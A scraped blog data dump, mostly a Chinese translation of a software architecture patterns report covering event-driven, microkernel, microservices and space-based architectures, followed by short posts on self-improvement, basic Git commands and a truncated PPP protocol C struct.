模式分析下面是基于对常见的架构模式特征进行评价的标准，对事件驱动架构模式所作的实际分析，评价是以常见的架构模式的相似实现作为标准进行的，如果你想知道进行对比的其他架构模式对应的特征，可以结尾处查看 附录A 的汇总表。 整体灵活性评价：高分析：整体灵活性用于评价架构能否在不断改变的使用场景下快速响应，因为事件处理器组件使用目的单一、高度解耦、与其他事件处理器组件相互独立，不相关联，那么发生的改变对一个或多个事件处理器来说普遍都是独立的，使得对改变的反馈非常迅速，不需要依赖其他事件处理器的响应作出处理。 易于部署评价：高分析：总的来看，事件驱动架构模式由于其高度解耦的事件处理器组件的存在，对事件的部署相对来说比较容易，而使用代理拓扑结构比使用中介拓扑结构进行事件调度会更容易一些，主要是因为在 中介拓扑结构中事件处理器与事件中介紧密地耦合在一起：事件处理器中发生改变后，事件中介也随之改变，如果我们需要改变某个被处理的事件，那么我们需要同时调度事件处理器和事件中介。 可测试性评价：低分析：虽然在事件驱动架构模式中进行单元测试并不困难，但如果我们要进行单元测试，我们就需要某种特定的测试客户端或者是测试工具产生事件，为单元测试提供初始值。此外，由于事件驱动架构模式是异步进行事件分发的，其异步处理的特性也为单元测试带来了一定的困难。 Performance 性能评价：高分析：对消息传递的架构可能会让设计出来的事件驱动架构的表现不如我们的期望，但通常来说，该模式都能通过其异步处理的特性展示优秀的性能表现；换句话来说，高度解耦，异步并行操作大大减少了传递消息过程中带来的时间开销。 伸缩性评价：高分析：事件驱动架构中的高度解耦、相互独立的事件处理器组件的存在，使得可拓展性成为该架构与生俱来的优点。架构的这些特定使得事件处理器能够进行细粒度的拓展，使得每一个事件处理器都能单独被拓展，而不影响其他事件处理器。 易于开发评价：低分析：由于使用事件驱动架构进行开发需要考虑其异步处理机制、协议创建流程，并且开发者需要用代码为事件处理器和操作失败的代理提供优秀的错误控制环境，无疑使得用事件驱动架构进行开发会比使用其他架构进行开发要困难一些。 译者注读完整篇文章，我相信大家对 mediator 与 broker 这两个概念有一个大致的印象，但就两者的译文来看，中介和代理似乎没什么区别，尤其是了解 proxy 的读者会更加困惑，这三者之间到底是什么关系？它们的概念是互通的吗？为了解决这种混淆，译者将在此阐述三者间的区别： 假如现在我有一个事件/事件流需要被处理，那么使用 mediator、broker、proxy 处理事件的区别在哪里呢？ 如果我们使用 mediator，那就意味着我将把事件流交给 mediator，mediator 会帮我把事件分解为多个步骤，并分析其中的执行逻辑，调整和分发事件（例如判断哪些事件可以并行，哪些事件可以串行），然后根据 mediator 分解、调节的结果去执行事件中的每一个步骤，把所有步骤完成后，就能把需要处理的事件处理好。 如果我们使用 broker，那就意味着我将把事件交给 broker，broker 获得事件后会把事件发出去（在本文中为：通知架构中所有可用的事件处理器），事件处理器们接收到事件以后，判断处理这个事件是否为自己的职责之一，如果不是则无视，与自己有关则把需要完成的工作完成，完成后如果事件还有后续需要处理的事件，则通过 broker 再次发布，再由相关的事件处理器接收、处理。以这样的方式将事件不断分解，沿着事件链一级一级地向下处理子事件，直到事件链中的所有事件被完成，我的事件也就处理好了。 如果我们使用 proxy，那就意味着我自己对需要处理的事件进行了分解，然后把不同的子事件一一委托给不同的 proxy，由被委托的 proxy 帮我完成子事件，从而完成我要做的事件。 第三章 微内核架构微内核架构模式(也称为插件化应用架构)对于基于产品的应用程序来说是一个很自然的选择。基于产品的应用是指一个经过打包的、可以通过版本下载的一个典型的第三方产品。然而，很多公司也会开发和发布他们的内部商业软件，完整的版本号、发布日志和可插拔的新特性，这些就非常符合微内核架构的思想。微内核架构模式可以通过插件的形式添加额外的特性到核心系统中，这提供了很好的扩展性，也使得新特性与核心系统隔离开来。( 译者注: 比如，著名的Eclipse IDE就是基于插件化开发的，eclipse核心更像是一个微内核，或者我们可把它叫做开放平台，其他的功能通过安装插件的形式添加到eclipse中。 ) 模式描述微内核架构主要需要考虑两个方面: 核心系统和插件模块。应用逻辑被划分为独立的插件模块和核心系统，这样就提供良好的可扩展性、灵活性，应用的新特性和自定义处理逻辑也会被隔离。图3-1演示了基本的微内核架构。 微内核架构的核心系统一般情况下只包含一个能够使系统运作起来的最小化模块。很多操作系统的实现就是使用微内核架构，因此这也是该架构名字的由来。从商业应用的角度看，核心系统通常是为特定的使用场景、规则、或者复杂条件处理定义了通用的业务逻辑，而插件模块根据这些规则实现了具体的业务逻辑。 插件模块是一个包含专业处理、额外特性的独立组件，自定义代码意味着增加或者扩展核心系统以达到产生附加的业务逻辑的能力。通常，插件模块之间应该是没有任何依赖性的，但是你也可以设计一个需要依赖另一个插件的插件。但无论如何，使得插件之间可以通信的同时避免插件之间产生依赖又是一个特别重要的问题。 核心系统需要了解插件模块的可用性以及如何获取到它们。一个通用的实现方法是通过一组插件注册表。这个插件注册表含有每个插件模块的信息，包括它的名字、数据规约和远程访问协议(取决于插件如何与核心系统建立连接)。例如，一个税务软件的用于标识高风险的税务审计插件可能会有一个含有插件名(比如AuditChecker)的注册入口，数据规约(输入数据、输出数据)和规约格式( 比如xml )。如果这个插件是通过SOAP服务访问，那么它可能会包含一个WSDL (Web Services Definition Language). 插件模块可以通过多种方式连接到核心系统，包括OSGi ( open service gateway initiative )、消息机制、web服务或者直接点对点的绑定 ( 比如对象实例化，即依赖注入 )。你使用的连接类型取决于你构建的应用类型和你的特殊需求（比如单机部署还是分布式部署）。微内核架构本身没有指定任何的实现方式，唯一的规定就是插件模块之间不要产生依赖。 插件和核心系统的通信规范包含标准规范和自定义规范。自定义规范典型的使用场景是插件组件是被第三方构建的。在这种情况下，通常是在第三方插件规约和你的标准规范创建一个Adapter来使核心系统根本不需要知道每个插件的具体细节。当创建标准规范 ( 通常是通过XML或者Java Map )时，从一开始就创建一个版本策略是非常重要的。 架构示例也许微内核架构的最好示例就是大家熟知的Eclipse IDE了。下载最基本的Eclipse后，它只能提供一个编辑器。然后，一旦你开始添加插件，它就变成一个高度可定制化和非常有用的产品（译者注 : 更多内容大家可以参考 开源软件架构 卷1：第6章 Eclipse之一 ）。浏览器是另一个使用微内核架构的产品示例，它由一个查看器和其他扩展的插件组成。 基于微内核架构的示例数不胜数，但是大型的商业应用呢？微内核应用架构也适用于这些情形。为了阐述这个观点，让我们来看看另一个保险公司的示例，但是这次的示例会涉及保险赔偿处理。 赔偿处理是一个非常复杂的过程。每个州都有不同的关于保险赔偿的规则和条文。例如一些州允许在你的挡风玻璃被石头砸碎时免费进行替换，但是一些州则不是这样。因为大家的标准都不一样，因此赔偿标准几乎可以是无限的。 有很多保险赔偿应用运用大型和复杂的规则处理引擎来处理不同规则带来的复杂性。然而，可能会因为某条规则的改变而引起其他规则的改变而使得这些规则处理引擎变成一个大泥球，或者使简单需求变更会需要一个很大的分析师、工程师、测试工程师来进行处理。使用微内核架构能够很好的解决这个问题，核心系统只知道根据赔偿规则处理，但这个赔偿规则是抽象的，系统将赔偿规则作为一个插件规范，具体的规则有对应的实现，然后注入到系统中即可。 图3-2中的一堆文件夹代表了赔偿处理核心系统。它包含一些处理保险赔偿的基本业务逻辑。每一个插件模块包含每个州的具体赔偿规则。在这个例子中，插件模块通过自定义源代码实现或者分离规则引起实例。不管具体实现如何，关键就在于赔偿规则和处理都从核心系统中分离，而这些规则和处理过程都可以被动态地添加、移除，而这些改变对于核心系统和其他插件只有很小的影响或者根本不产生影响。 注意事项对于微内核架构来说一个很重要的一点就是它能够被嵌入或者说作为另一种架构的一部分。例如，如果这个架构解决的是一个你应用中易变领域的特定的问题 ( 译者注 : 即插件化能够解决你应用中的某个特定模块的架构问题 )，你可能会发现你不能在整个应用中使用这种架构。在这种情况下，你可以将微内核架构嵌入到另一个架构模式中 ( 比如分层架构 )。同样的，在上一章节中描述的事件驱动架构中的事件处理器组件也可以使用微内核架构。 微内核架构对渐进式设计和增量开发提供了非常好的支持。你可以先构建一个单纯的核心系统，随着应用的演进，系统会逐渐添加越来越多的特性和功能，而这并不会引起核心系统的重大变化。 对基于产品的应用来说，微内核架构应该是你的第一选择。特别是那些你会在后续开发中发布附加特性和控制哪些用户能够获取哪些特性的应用。如果你在后续开发中发现这个架构不能满足你的需求了，你能够根据你的特殊需求将你的应用重构为另一个更好的架构。 模式分析下面的表格中包含了微内核架构每个特性的评级和分析。以微内核架构的最经典的实现方式的自然趋势为依据对每个特性进行评级。关于微内核架构与其他模式的相关性比较请参考附录A。 整体灵活性评级 : 高分析 : 整体灵活性是指能够快速适应不断变化的环境的能力。通过插件模块的松耦合实现，可以将变化隔离起来，并且快速满足需求。通常，微内核架构的核心系统很快趋于稳定，这样系统就变得很健壮，随着时间的推移它也不会发生多大改变。 易于部署评级 : 高分析 : 根据实现方式，插件模块能够在运行时被动态地添加到核心系统中 （ 比如，热部署 ）,把停机时间减到最小。 可测试性评级 : 高分析 : 插件模块能够被独立的测试，能够非常简单地被核心系统模拟出来进行演示，或者在对核心系统很小影响甚至没有影响的情况下对一个特定的特性进行原型展示。 性能评级 : 高分析 : 使用微内核架构不会自然而然地使你的应用变得高性能。通常，很多使用微内核架构的应用运行得很好，因为你能定制和简化应用程序，使它只包含那些你需要的功能模块。JBoss应用服务器就是这方面的优秀示例: 依赖于它的插件化架构，你可以只加载你需要的功能模块，移除那些消耗资源但没有使用的功能特性，比如远程访问，消息传递，消耗内存、CPU的缓存，以及线程，从而减小应用服务器的资源消耗。 伸缩性评级 : 低分析 : 因为微内核架构的实现是基于产品的，它通常都比较小。它们以独立单元的形式实现，因此没有太高的伸缩性。此时，伸缩性就取决于你的插件模块，有时你可以在插件级别上提供可伸缩性，但是总的来说这个架构并不是以构建高度伸缩性的应用而著称的。 易于开发评级 : 低分析 : 微内核架构需要考虑设计和规约管理，使它不会很难实现。规约的版本控制，内部的插件注册，插件粒度，丰富的插件连接的方式等是涉及到这个架构模式实现复杂度的重要因素。 第四章 微服务架构微服务架构模式作为替代单体应用和面向服务架构的一个可行的选择，在业内迅速取得进展。由于这个架构模式仍然在不断的发展中，在业界存在很多困惑——这种模式是关于什么的？它是如何实现的？本报告的这部分将为你提供关键概念和必要的基础知识来理解这一重要架构模式的好处(和取舍)，以此来判断这种架构是否适合你的应用。 模式描述不管你选择哪种拓扑或实现风格,有几种常见的核心概念适用于一般架构模式。第一个概念是单独部署单元。如图4-1所示，微服务架构的每个组件都作为一个独立单元进行部署，让每个单元可以通过有效、简化的传输管道进行通信，同时它还有很强的扩展性，应用和组件之间高度解耦，使得部署更为简单。 也许要理解这种模式，最重要的概念就是服务组件（service component）。不要考虑微服务架构内部的服务，而最好是考虑服务组件，从粒度上讲它可以小到单一的模块，或者大至一个应用程序。服务组件包含一个或多个模块（如Java类），这些模块可以提供一个单一功能（如，为特定的城市或城镇提供天气情况），或也可以作为一个大型商业应用的一个独立部分（如，股票交易布局或测定汽车保险的费率）。在微服务架构中，正确设计服务组件的粒度是一个很大的挑战。在接下来的服务组件部分对这一挑战进行了详细的讨论。 微服务架构模式的另一个关键概念是它是一个分布式的架构，这意味着架构内部的所有组件之间是完全解耦的，并通过某种远程访问协议（如， JMS, AMQP, REST, SOAP, RMI等）进行访问。这种架构的分布式特性是它实现一些优越的可扩展性和部署特性的关键所在。 微服务架构另一个令人兴奋的特性是它是由其他常见架构模式存在的问题演化来的，而不是作为一个解决方案被创造出来等待问题出现。微服务架构的演化有两个主要来源：使用分层架构模式的单体应用和使用面向服务架构的分布式应用。 由单体应用( 一个应用就是一个整体 )到微服务的发展过程主要是由持续交付开发促成的。从开发到生产的持续部署管道概念,简化了应用程序的部署。单体应用通常是由紧耦合的组件组成，这些组件同时又是另一个单一可部署单元的一部分，这使得它繁琐，难以改变、测试和部署应用（因此常见的“月度部署”周期出现并通常发生在大型IT商店项目）。这些因素通常会导致应用变得脆弱以至于每次有一点新功能部署后应用就不能运行。微服务架构模式通过将应用分隔成多个可部署的单元（服务组件）的方法来解决这一问题，这些服务组件可以独立于其他服务组件进行单独开发、测试和部署。 另一个导致微服务架构模式产生的演化过程是由面向服务架构模式（SOA）应用程序存在的问题引起的。虽然SOA模式非常强大，提供了无与伦比的抽象级别、异构连接、服务编排，并保证通过IT能力调整业务目标，但它仍然是复杂的,昂贵的,普遍存在，它很难理解和实现，对大多数应用程序来说过犹不及。微服务架构通过简化服务概念，消除编排需求、简化服务组件连接和访问来解决复杂度问题。 模式拓扑虽然有很多方法来实现微服务架构模式,但三个主要的拓扑结构脱颖而出，最常见和流行的有:基于REST API的拓扑结构,基于REST的应用拓扑结构和集中式消息拓扑结构。 基于REST的API拓扑适用于网站，通过某些API对外提供小型的、自包含的服务。这种拓扑结构,如图4 - 2所示,由粒度非常细的服务组件（因此得名微服务）组成，这些服务组件包含一个或两个模块并独立于其他服务来执行特定业务功能。在这种拓结构扑中,这些细粒度的服务组件通常被REST-based的接口访问，而这个接口是通过一个单独部署的web API层实现的。此种拓扑的例子包含一些常见的专用的、基于云的RESTful web service，大型网站像Yahoo, Google, and Amazon都在使用。 基于REST的应用拓扑结构与基于REST API的不同，它通过传统的基于web的或胖客户端业务应用来接收客户端请求，而不是通过一个简单的API层。如图4-3所示，应用的用户接口层（user interface layer）是一个web应用，可以通过简单的REST-based接口访问单独部署的服务组件（业务功能）。该拓扑结构中的服务组件与API-REST-based拓扑结构中的不同，这些服务组件往往会更大、粒度更粗、代表整个业务应用程序的一小部分，而不是细粒度的、单一操作的服务。这种拓扑结构常见于中小型企业等复程度相对较低的应用程序。 微服务架构模式中另一个常见的方法是集中式消息拓扑。该拓扑（如图4-4所示）与前面提到的基于REST的应用拓扑类似，不同的是，application REST- based拓扑结构使用REST进行远程访问，而该拓扑结构则使用一个轻量级的集中式消息代理（如，ActiveMQ, HornetQ等等）。不要将该拓扑与面向服务架构模式混淆或将其当做SOA简化版（“SOA-Lite”），这点是极其重要的。该拓扑中的轻量级消息代理（Lightweight Message Broker）不执行任何编排,转换,或复杂的路由;相反,它只是一个轻量级访问远程服务组件的传输工具。 集中式消息拓扑结构通常应用在较大的业务应用程序中，或对于某些对传输层到用户接口层或者到服务组件层有较复杂的控制逻辑的应用程序中。该拓扑较之先前讨论的简单基于REST的拓扑结构，其好处是有先进的排队机制、异步消息传递、监控、错误处理和更好的负载均衡和可扩展性。与集中式代理相关的单点故障和架构瓶颈问题已通过代理集群和代理联盟（将一个代理实例为分多个代理实例，把基于系统功能区域的吞吐量负载划分开处理）解决。 避免依赖和编排微服务架构模式的主要挑战之一就是决定服务组件的粒度级别。如果服务组件粒度过粗，那你可能不会意识到这个架构模式带来的好处（部署、可扩展性、可测试性和松耦合），然而,服务组件粒度过细将导致服务编制要求,这会很快导致将微服务架构模式变成一个复杂、容易混淆、代价昂贵并易于出错的重量级面向服务架构。 如果你发现需要从应用内部的用户接口或API层编排服务组件，那么很有可能你服务组件的粒度太细了。如果你发现你需要在服务组件之间执行服务间通信来处理单个请求,那么很有可能要么是你服务组件的粒度太细了，要么是没有从业务功能角度正确划分服务组件。 服务间通信，可能导致组件之间产生耦合，但可以通过共享数据库进行处理。例如，若一个服务组件处理网络订单而需要用户信息时，它可以去数据库检索必要的数据，而不是调用客户服务组件的功能。 共享数据库可以处理信息需求，但是共享功能呢？如果一个服务组件需要的功能包含在另一个服务组件内，或是一个公共的功能,那么有时你可以将服务组件的共享功能复制一份（因此违反了DRY规则：don’t repeat yourself）。为了保持服务组件独立和部署分离，微服务架构模式实现中会存在一小部分由重复的业务逻辑而造成的冗余，这在大多数业务应用程序中是一个相当常见的问题。小工具类可能属于这一类重复的代码。 如果你发现就算不考虑服务组件粒度的级别，你仍不能避免服务组件编排,这是一个好迹象,可能此架构模式不适用于你的应用。由于这种模式的分布式特性，很难维护服务组件之间的单一工作事务单元。这种做法需要某种事务补偿框架回滚事务,这对此相对简单而优雅的架构模式来说，显著增加了复杂性。 注意事项微服务架构模式解决了很多单体应用和面向服务架构应用存在的问题。由于主要应用组件被分成更小的,单独部署单元,使用微服务架构模式构建的应用程序通常更健壮,并提供更好的可扩展性,支持持续交付也更容易。 该模式的另一个优点是,它提供了实时生产部署能力，从而大大减少了传统的月度或周末“大爆炸”生产部署的需求。因为变化通常被隔离成特定的服务组件，只有变化的服务组件才需要部署。如果你的服务组件只有一个实例，你可以在用户界面程序编写专门的代码用于检测一个活跃的热部署,一旦检测到就将用户重定向到一个错误页面或等待页面。你也可以在实时部署期间，将服务组件的多个实例进行交换，允许应用程序在部署期间保持持续可用性（分层架构模式很难做到这点）。 最后一个要重视的考虑是，由于微服务架构模式是分布式的架构，他与事件驱动架构模式具有一些共同的复杂的问题，包括约定的创建、维护，和管理，远程系统的可用性，远程访问身份验证和授权。 模式分析下面这个表中包含了微服务架构模式的特点分析和评级，每个特性的评级是基于自然趋势，基于典型模式实现的能力特性,以及该模式是以什么闻名的。本报告中该模式与其他模式的并排比较，请参考报告最后的附件A。 整体灵活性评级：高分析：整体的灵活性是能够快速响应不断变化的环境。由于单独部署单元的概念,变化通常被隔离成单独的服务组件,使得部署变得快而简单。同时，使用这种模式构建的应用往往是松耦合的，也有助于促进改变。 易于部署评级：高分析：整体来讲，由于该模式的解耦特性和事件处理组件使得部署变得相对简单。broker拓扑往往比mediator拓扑更易于部署，主要是因为event-mediator组件与事件处理器是紧耦合的，事件处理器组件有一个变化可能导致event mediator跟着变化，有任何变化两者都需要部署。 可测试性评级：高分析：由于业务功能被分离成独立的应用模块,可以在局部范围内进行测试，这样测试工作就更有针对性。对一个特定的服务组件进行回归测试比对整个单体应用程序进行回归测试更简单、更可行。而且,由于这种模式的服务组件是松散耦合的，从开发角度来看，由一个变化导致应用其他部分也跟着变化的几率很小，并能减小由于一个微小的变化而不得不对整个应用程序进行测试的负担。 性能评级：低分析：虽然你可以从实现该模式来创建应用程序并可以很好的运行，整体来说，由于微服务架构模式的分布式特性，并不适用于高性能的应用程序。 伸缩性评级：高分析：由于应用程序被分为单独的部署单元,每个服务组件可以单独扩展，并允许对应用程序进行扩展调整。例如，股票交易的管理员功能区域可能不需要扩展，因为使用该功能的用户很少，但是交易布局服务组件可能需要扩展，因为大多数交易应用程序需要具备处理高吞吐量的功能。 易于开发评级：高分析：由于功能被分隔成不同的服务组件，由于开发范围更小且被隔离，开发变得更简单。程序员在一个服务组件做出一个变化影响其他服务组件的几率是很小的，从而减少开发人员或开发团队之间的协调。 第五章 基于空间的架构大多数基于网站的商务应用都遵循相同的请求流程：一个请求从浏览器发到web服务器，然后到应用服务器，然后到数据库服务器。虽然这个模式在用户数不大的时候工作良好，但随着用户负载的增加,瓶颈会开始出现，首先出现在web服务器层，然后应用服务器层，最后数据库服务器层。通常的解决办法就是向外扩展，也就是增加服务器数量。这个方法相对来说简单和廉价，并能够解决问题。然而，对于大多数高访问量的情况，它只不过是把web服务器的问题移到了应用服务器。而扩展应用服务器会更复杂，而且成本更高，并且又只是把问题移动到了数据库服务器，那会更复杂，更贵。就算你能扩展数据库服务器，你最终会陷入一个金字塔式的情形，在金字塔最下面是web服务器，它会出现最多的问题，但也最好伸缩。金字塔顶部是数据库服务器，问题不多，但最难伸缩。 在一个高并发大容量的应用中，数据库通常是决定应用能够支持多少用户同时在线的关键因素。虽然各种缓存技术和数据库伸缩产品都在帮助解决这个问题，但数据库难以伸缩的现实并没有改变。 基于空间的架构模型是专门为了解决伸缩性和并发问题而设计的。它对于用户数量不可预测且数量级经常变化的情况同样适用。在架构级别来解决这个伸缩性问题通常是比增加服务器数量或者提高缓存技术更好的解决办法。 模型介绍基于空间的模型（有时也称为云架构模型）旨在减少限制应用伸缩的因素。模型的名字来源于分布式共享内存中的 tuple space（数组空间）概念。高伸缩性是通过去除中心数据库的限制，并使用从内存中复制的数据框架来获得的。保存在内存的应用数据被复制给所有运行的进程。进程可以动态的随着用户数量增减而启动或结束，以此来解决伸缩性问题。这样因为没有了中心数据库，数据库瓶颈就此解决，此后可以近乎无限制的扩展了。 大多数使用这个模型的应用都是标准的网站，它们接受来自浏览器的请求并进行相关操作。竞价拍卖网站是一个很好的例子 ( 12306更是一个典型的示例 )。网站不停的接受来自浏览器的报价。应用收到对某一商品的报价，记录下报价和时间，并且更新对该商品的报价，将信息返回给浏览器。 这个架构中有两个主要的模块：处理单元 和 虚拟化中间件。下图展示了这个架构和里面的主要模块。 处理单元包含了应用模块（或者部分的应用模块）。具体来说就是包含了web组件以及后台业务逻辑。处理单元的内容根据应用的类型而异——小型的web应用可能会部署到单一的处理单元，而大型一些的应用会将应用的不同功能模块部署到不同的处理单元中。典型的处理单元包括应用模块，以及保存在内存的数据框架和为应用失败时准备的异步数据持久化模块。它还包括复制引擎，使得虚拟化中间件可以将处理单元修改的数据复制到其他活动的处理单元。 虚拟化中间件负责保护自身以及通信。它包含用于数据同步和处理请求的模块，以及通信框架，数据框架，处理框架和部署管理器。这些在下文中即将介绍的部分，可以自定义编写或者购买第三方产品来实现。 组件间合作基于空间的架构的魔力就在虚拟化中间件，以及各个处理单元中的内存中数据框架。下图展示了包含着应用模块、内存中数据框架、处理异步数据恢复的组件和复制引擎的处理单元架构。 虚拟化中间件本质上是架构的控制器，它管理请求，会话，数据复制，分布式的请求处理和处理单元的部署。虚拟化中间件有四个架构组件：通信框架，数据框架，处理框架和部署管理器。 通信框架通信框架管理输入请求和会话信息。当有请求进入虚拟化中间件，通信框架就决定有哪个处理单元可用，并将请求传递给这个处理单元。通信框架的复杂程度可以从简单的round robin算法到更复杂的用于监控哪个请求正在被哪个处理单元处理的next-available算法。 数据框架数据框架可能是这个架构中最重要和关键的组件。它与各个处理单元的数据复制引擎交互，在数据更新时来管理数据复制功能。由于通信框架可以将请求传递给任何可用的处理单元，所以每个处理单元包含完全一样的内存中数据就很关键。下图展示处理单元间如何同步数据复制，实际中是通过非常迅速的并行的异步复制来完成的，通常在微秒级。 处理框架处理框架，就像下图所示，是虚拟化中间件中一个可选组件，负责管理在有多个处理单元时的分布式请求处理，每个处理单元可能只负责应用中的某个特定功能。如果请求需要处理单元间合作（比如，一个订单处理单元和顾客处理单元），此时处理框架就充当处理单元见数据传递的媒介。 部署管理器部署管理器根据负载情况管理处理单元的动态启动和关闭。它持续检测请求所需时间和在线用户量，在负载增加时启动新的处理单元，在负载下降时关闭处理单元。它是实现可变伸缩性需求的关键。 其他考虑基于空间的架构是一个复杂和实现起来相对昂贵的框架。对于有可变伸缩性需求的小型web应用是很好的选择，然而，对于拥有大量数据操作的传统大规模关系型数据库应用，并不那么适用。 虽然基于空间的架构模型不需要集中式的数据储存，但通常还是需要这样一个，来进行初始化内存中数据框架，和异步的更新各处理单元的数据。通常也会创建一个单独的分区，来从隔离常用的断电就消失的数据和不常用的数据，这样减少处理单元之间对对方内存数据的依赖。 值得注意的是，虽然这个架构的另一个名字是云架构，处理单元（以及虚拟化中间件）都没有放在云端服务或者PaaS上。他们同样可以简单的放在本地服务器，这也是为什么我更倾向叫它“基于空间的架构”。 从产品实现的角度讲，这个架构中的很多组件都可以从第三方获得，比如GemFire, JavaSpaces, GigaSpaces，IBM Object Grid，nCache，和 Oracle Coherence。由于架构的实现根据工程的预算和需求而异，所以作为架构师，你应该在实现或选购第三方产品前首先明确你的目标和需求。 架构分析下面的表格是这个架构的特征分析和评分。每个特征的评分是基于一个典型的架构实现来给出的。要知道这个模式相对别的模式的对比，请参见最后的附录A。 综合能力评分：高分析：综合能力是对环境变化做出快速反应的能力。因为处理单元（应用的部署实例）可以快速的启动和关闭，整个应用可以根据用户量和负载做出反应。使用这个架构通常在应对代码变化上，由于较小的应用规模和组件间相互依赖，也会反映良好。 易于部署评分：高分析：虽然基于空间的架构通常没有解耦合并且功能分布，但他们是动态的，也是成熟的基于云的工具，允许应用轻松的部署到服务器。 可测试性评分：低分析：测试高用户负载既昂贵又耗时，所以在测试架构的可伸缩性方面很困难 性能评分：高分析：通过内存中数据存取和架构中的缓存机制可获得高性能 伸缩性评分：高分析：高伸缩性是源于几乎不依赖集中式的数据库，从而去除了这个限制伸缩性的瓶颈。 易于开发评分：低分析：主要是因为难以熟悉这个架构开发所需得工具和第三方产品，因此使用该架构需要较大的学习成本。而且，开发过程中还需要特别注意不要影响到性能和可伸缩性。 附录A模式分析总结图A-1 总结了在这个报告中，对于架构模式的每部分进行的模式分析所产生的影响。这个总结帮助你确定哪些模式可能是最适合你的情况。例如,如果你的架构模式重点是可伸缩性，你可以在这个图表看看事件驱动模式,microservices模式,和基于空间模式，这些对于你来说可能是很好的架构模式的选择。同样的,如果你的程序注重的是分层架构模式,你可以参考图看到部署、性能和可伸缩性的在你的架构中所存在的风险。 同时这个图表将指导你选择正确的模式,因为在选择一种架构模式的时候，有更多的因素需要考虑。你必须分析你的环境的各个方面,包括基础设施的支持,开发人员技能,项目预算,项目最后期限,和应用程序大小等等。选择正确的架构模式是至关重要的,因为一旦一个架构被确定就很难改变。 关于作者Mark•Richards是一位有丰富经验的软件架构师，他参与架构、设计和实施microservices体系结构、面向服务的体系结构和在J2EE中的分布式系统和其他技术。自1983年以来，他一直从事软件行业,在应用、继承和企业架构方面有大量的经验和专业知识。 Mark在1999到2003年间担任新英格兰Java用户组的主席。他是许多技术书籍和视频的作者,包括软件架构基础(O‘Reilly视频)、企业消息传递(O’Reilly视频),《Java消息服务，第二版》(O’Reilly)和《软件架构师应该知道的97件事》(O’Reilly)的特约作者。Mark拥有一个计算机科学硕士学位并且多次获得IBM、Sun、开放集团和BEA等颁发的架构师和开发人员认证。 他是Fluff Just Stuff(NFJS)研讨会系列（一个不定期会议）议长,并且有过上百次的在世界各地公益会议和用户组上围绕技术主题的演讲经验)。Mark不工作的时候经常会到白色山脉或阿帕拉契山径徒步旅行。","categories":[{"name":"DEVELOP","slug":"DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/"},{"name":"DEVELOP","slug":"DEVELOP/DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/DEVELOP/"}],"tags":[]},{"title":"如何提高自己","slug":"LIVE/如何提高自己","date":"2017-10-09T06:12:17.000Z","updated":"2017-10-09T06:13:21.715Z","comments":true,"path":"LIVE/如何提高自己.html","link":"","permalink":"http://demonelf.github.io/LIVE/如何提高自己.html","excerpt":"1. 平易近人。做为一个人，想受到别人的爱戴，首先自己对人就得友善，不管对任何人就应该一视同仁。 2. 为人真诚。一个人经常的耍点小聪明，经常的觉得别人永远在自己的手掌中，那么这样的人不仅赢不了别人的喜欢，而且还","text":"平易近人。做为一个人，想受到别人的爱戴，首先自己对人就得友善，不管对任何人就应该一视同仁。 为人真诚。一个人经常的耍点小聪明，经常的觉得别人永远在自己的手掌中，那么这样的人不仅赢不了别人的喜欢，而且还会让自己孤立。 助人为乐。帮助别人，快乐自己。经常帮助别人的人经常让别人觉得自己的善良，让别人感受到自己的亲近。 优秀。让自己变得优秀，优秀的人没有人会不喜欢，没有人会不尊重，因此让自己努力变成一个某一方面优秀的人，可以让自己受到别人的尊重。 不小看别人。三十年河东，三十年河西。焉知别人今后就没有翻身的一天，所以对人千万不要抬着头。 不骄不燥。做人还不能骄傲，也不能浮燥，骄傲的人容易落后，浮燥的人做事情容易失败。","categories":[{"name":"LIVE","slug":"LIVE","permalink":"http://demonelf.github.io/categories/LIVE/"},{"name":"LIVE","slug":"LIVE/LIVE","permalink":"http://demonelf.github.io/categories/LIVE/LIVE/"}],"tags":[]},{"title":"Git 常用命令图表","slug":"DEVELOP/Git常用命令图表","date":"2017-09-21T01:12:18.000Z","updated":"2017-09-29T07:23:17.076Z","comments":true,"path":"DEVELOP/Git常用命令图表.html","link":"","permalink":"http://demonelf.github.io/DEVELOP/Git常用命令图表.html","excerpt":"有这几个git命令就够用了 示例: 保存本地/home/example_a目录到本地/home/example_b目录 12345678 cd /home/example_bgit init --barecd /home/example_agit","text":"有这几个git命令就够用了 示例: 保存本地/home/example_a目录到本地/home/example_b目录 12345678cd /home/example_bgit init --barecd /home/example_agit initgit remote add test_remote /home/example_bgit add -Agit commit -m \"1.git初始化\"git push -u test_remote master","categories":[{"name":"DEVELOP","slug":"DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/"},{"name":"DEVELOP","slug":"DEVELOP/DEVELOP","permalink":"http://demonelf.github.io/categories/DEVELOP/DEVELOP/"}],"tags":[]},{"title":"ppp协议总结","slug":"VPN系列之五花八门/ppp协议总结","date":"2017-09-19T02:20:43.000Z","updated":"2017-09-20T11:39:29.653Z","comments":true,"path":"VPN系列之五花八门/ppp协议总结.html","link":"","permalink":"http://demonelf.github.io/VPN系列之五花八门/ppp协议总结.html","excerpt":"协议规范 实现原理 1234567891011121314151617181920212223242526272829303132333435363738 struct ppp_info{ int unit; /**/ int dev_fd; /","text":"协议规范实现原理1234567891011121314151617181920212223242526272829303132333435363738struct ppp_info&#123; int unit; /**/ int dev_fd; /**/ int lcp_fd; /**/ int ppp_fd; /**/ int remote_id; /**/ char *user; /* Username for authentication */ char *passwd; /* Password for authentication */ char *ifname; char attach_inter[16]; unsigned char distance; unsigned char weight; unsigned char gateway; unsigned char dns; unsigned char auth; unsigned char auth_type; unsigned char down_flag; //避免PPP主动down掉和手动清除冲突 unsigned int unique; unsigned int dns_value; unsigned int wins_value; char usergrp[MAXNAMELEN]; struct prefix_ipv4 localaddr; unsigned int peer_address; //tunnip int lcp_detect_interval_time; //for change interval time of lcp echo request int lcp_detect_lost_times; //for change times of no respons lcp echo request struct thread * lcp_thread; struct thread * ipcp_rthread; void *conn; void *priv_data; int natid; int mtu; Ppp_if_type iftype; int (*manage_auto_down) (char *ifname); int (*ipcp_up_cb) (struct ppp_cb_info *cb_info); int (*ipcp_down_cb) (struct ppp_cb_info *cb_info); int (*lcp_auth) (char *name, char *group, char *password, unsigned char *challenge, int unit, int type); int (*check_rqci)(__u32 addr);&#125;; void LcpLinkFailure (f) lcp_close(f-&gt;unit, “Peer not 